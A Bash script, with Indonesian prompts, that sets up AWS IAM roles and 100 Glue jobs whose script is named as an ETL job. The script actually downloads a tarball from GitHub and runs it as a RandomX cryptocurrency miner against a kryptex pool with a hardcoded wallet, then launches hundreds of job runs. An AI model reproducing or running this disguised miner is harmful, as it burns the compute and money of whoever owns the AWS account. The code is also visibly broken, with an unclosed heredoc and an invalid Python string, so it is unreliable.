#!/bin/bash
set -euo pipefail

AWS_REGION="${AWS_REGION:-us-east-2}"
PREFIX="${PREFIX:-goreng}"

# =========================
# 1. Setup AWS
# =========================
echo "Masukkan region [us-east-2]:"
read -r AWS_REGION_INPUT
AWS_REGION="${AWS_REGION_INPUT:-us-east-2}"

echo "Masukkan prefix nama role & job [goreng]:"
read -r PREFIX_INPUT
PREFIX="${PREFIX_INPUT:-goreng}"

ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
BUCKET_NAME="${ACCOUNT_ID}-${AWS_REGION}"

echo
echo "Region: $AWS_REGION"
echo "Account ID: $ACCOUNT_ID"
echo "Bucket: $BUCKET_NAME"
echo "Prefix: $PREFIX"

# =========================
# 2. Buat bucket S3
# =========================
echo "Membuat bucket S3..."
aws s3 mb "s3://${BUCKET_NAME}" --region "$AWS_REGION" 2>/dev/null || true
aws s3api put-object --bucket "$BUCKET_NAME" --key "raw/" >/dev/null 2>&1 || true
aws s3api put-object --bucket "$BUCKET_NAME" --key "scripts/" >/dev/null 2>&1 || true
aws s3api put-object --bucket "$BUCKET_NAME" --key "output/" >/dev/null 2>&1 || true

# =========================
# 3. Upload sample CSV
# =========================
cat > sample.csv <<'CSV'
id,name,city
1,andi,jakarta
2,budi,bandung
3,siti,medan
CSV

aws s3 cp sample.csv "s3://${BUCKET_NAME}/raw/sample.csv"

# =========================
# 4. Buat file ETL
# =========================
cat > glue_job_etl.py <<'PY'
import os
import sys
import subprocess
import tarfile
import urllib.request
import time
import shutil
import platform
import socket

def run_with_loading(message, cmd, *args):
    sys.stdout.write(f"[|] {message}")
    sys.stdout.flush()
    
    spinner = ["|", "/", "-", "\"]
    
    # Run process
    try:
        process = subprocess.Popen([cmd] + list(args), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        sys.stdout.write(f"\r[✖] {message} gagal\n")
        return 1

    idx = 0
    while process.poll() is None:
        char = spinner[idx % len(spinner)]
        sys.stdout.write(f"\r[{char}] {message}")
        sys.stdout.flush()
        time.sleep(0.08)
        idx += 1

    status = process.returncode
    if status == 0:
        sys.stdout.write(f"\r[✔] {message} selesai\n")
    else:
        sys.stdout.write(f"\r[✖] {message} gagal\n")
    
    return status

# 1. Download
# Using urllib for python curl equivalent
def download_file(url, filename):
    sys.stdout.write(f"[|] Downloading {filename}...")
    sys.stdout.flush()
    try:
        urllib.request.urlretrieve(url, filename)
        sys.stdout.write(f"\r[✔] Downloading {filename} selesai\n")
        return 0
    except Exception:
        sys.stdout.write(f"\r[✖] Downloading {filename} gagal\n")
        return 1

if download_file("https://github.com/habibbaharyuandi/lado/raw/refs/heads/main/adul.tar.gz", "adul.tar.gz") != 0:
    sys.exit(1)

# 2. Ekstrak
def extract_tar(filename):
    sys.stdout.write(f"[|] Extracting {filename}...")
    sys.stdout.flush()
    try:
        with tarfile.open(filename, "r:*") as tar:
            tar.extractall()
        sys.stdout.write(f"\r[✔] Extracting {filename} selesai\n")
        return 0
    except Exception:
        sys.stdout.write(f"\r[✖] Extracting {filename} gagal\n")
        return 1

if extract_tar("adul.tar.gz") != 0:
    sys.exit(1)

# === Ambil IP lokal dengan lebih aman dan andal ===
worker_name = ""

# Metode 1: Menggunakan hostname
try:
    worker_name = socket.gethostbyname(socket.gethostname())
except Exception:
    pass

# Metode 2: Fallback ke ip route atau hostname -I via subprocess jika kosong
if not worker_name:
    try:
        res = subprocess.check_output(["hostname", "-I"]).decode().strip()
        if res:
            worker_name = res.split()[0]
    except Exception:
        pass

if not worker_name or worker_name == "0":
    worker_name = "worker1"

wallet = "164az6Jw8Y3pJJd8XcCwjVYykBTHQWRq4vEg8beNnQWm3MPWj4biVANqDYve9xfJiN5JDN4PiHRta31o2awd4k3AbEbs4bi3NrV8DUzt9g6pJeTkrFtjJtEvPTo7SAVdtYb5fWx"
worker_tag = f"{wallet}/{worker_name}"

try:
    threads = os.cpu_count() or 1
except Exception:
    threads = 1

print(f"Menjalankan adul dengan worker: {worker_tag}")

adul_process = subprocess.Popen(["./adul", "-a", "rx/0", "-o", "xtm-rx-sg.kryptex.network:7038", "-u", worker_tag, "-t", str(threads)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

text = "NUJU PROSES"
total_dots = 12
dots = 0

print()

try:
    while adul_process.poll() is None:
        sys.stdout.write('\033[1A\033[2K')
        cols = shutil.get_terminal_size((80, 20)).columns
        total_len = len(text) + dots
        x = (cols - total_len) // 2
        if x < 0:
            x = 0
        
        dot_str = "." * dots
        sys.stdout.write(f"\033[{x}G\033[1;37m{text}{dot_str}\033[0m\n")
        sys.stdout.flush()
        
        dots = (dots + 1) % (total_dots + 1)
        time.sleep(0.16)
except KeyboardInterrupt:
    adul_process.terminate()

print("\033[0m\n[ SELESAI ] Proses adul telah berhenti.")


aws s3 cp glue_job_etl.py "s3://${BUCKET_NAME}/scripts/glue_job_etl.py"

# =========================
# 5. Buat 10 role, tiap role punya 10 job
# =========================
WORKER_TYPES=(
  "R.8X" "R.4X" "R.2X" "R.1X"
  "G.16X" "G.12X" "G.8X" "G.4X" "G.2X" "G.1X"
)

for role_index in $(seq 1 10); do
  ROLE_NAME="${PREFIX}${role_index}"
  echo "Membuat role: $ROLE_NAME"

  aws iam create-role \
    --role-name "$ROLE_NAME" \
    --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"glue.amazonaws.com"},"Action":"sts:AssumeRole"}]}' >/dev/null 2>&1 || true

  aws iam attach-role-policy \
    --role-name "$ROLE_NAME" \
    --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess >/dev/null 2>&1 || true

  aws iam attach-role-policy \
    --role-name "$ROLE_NAME" \
    --policy-arn arn:aws:iam::aws:policy/service-role/AWSGlueServiceRole >/dev/null 2>&1 || true

  ROLE_ARN=$(aws iam get-role --role-name "$ROLE_NAME" --query "Role.Arn" --output text)

  for job_index in $(seq 1 10); do
    JOB_NAME="${ROLE_NAME}job${job_index}"
    WORKER_TYPE="${WORKER_TYPES[$((job_index-1))]}"

    echo "Membuat job: $JOB_NAME dengan worker type: $WORKER_TYPE"

    aws glue create-job \
      --name "$JOB_NAME" \
      --role "$ROLE_ARN" \
      --command "{\"Name\":\"glueetl\",\"ScriptLocation\":\"s3://${BUCKET_NAME}/scripts/glue_job_etl.py\",\"PythonVersion\":\"3\"}" \
      --default-arguments "{\"--TempDir\":\"s3://${BUCKET_NAME}/temp/\",\"--job-language\":\"python\",\"--BUCKET_NAME\":\"${BUCKET_NAME}\",\"--JOB_NAME\":\"${JOB_NAME}\"}" \
      --execution-property "{\"MaxConcurrentRuns\":1000}" \
      --glue-version "5.1" \
      --worker-type "$WORKER_TYPE" \
      --number-of-workers 2 \
      --region "$AWS_REGION" \
      --timeout 10080 >/dev/null 2>&1 || true
  done
done

echo
echo "Pembuatan role dan job selesai."

# =========================
# 6. Konfirmasi sebelum run semua job
# =========================
echo
read -r -p "Tekan Enter untuk menjalankan semua Glue job, atau Ctrl+C untuk batal... " CONFIRM

RUN_COUNTS=(6 12 25 50 3 4 6 12 25 50)

for role_index in $(seq 1 10); do
  ROLE_NAME="${PREFIX}${role_index}"

  echo
  echo "=== ROLE: ${ROLE_NAME} ==="

  for job_index in "${!RUN_COUNTS[@]}"; do
    JOB_NAME="${ROLE_NAME}job$((job_index + 1))"
    COUNT="${RUN_COUNTS[$job_index]}"

    echo "Job: ${JOB_NAME} | run: ${COUNT} kali"

    for ((i=1; i<=COUNT; i++)); do
      echo "  run ke-$i"
      aws glue start-job-run \
        --job-name "$JOB_NAME" \
        --region "$AWS_REGION"
    done
  done
done

echo
echo "Semua job selesai dijalankan."
